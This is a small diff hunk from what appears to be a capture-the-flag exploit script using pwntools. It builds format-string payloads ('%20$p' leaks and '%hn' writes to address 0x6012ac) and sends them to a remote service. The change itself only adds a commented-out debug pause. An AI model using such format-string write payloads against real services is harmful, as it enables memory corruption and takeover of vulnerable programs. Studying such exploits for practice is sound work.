@@ -7,6 +7,7 @@ y = remote(host, port)
 
 a = 0x6012ac
 
+#raw_input('@')
 #p = '%20$p.'.ljust(0x20, ) + p64(a)
 #p = '%4207849484c%20$n.'.ljust(0x20, ) + p64(a)
 p = '%45068c%20$hn%19138c%21$hn%.'.ljust(0x20, '\x00') + p64(a) + p64(a+2)
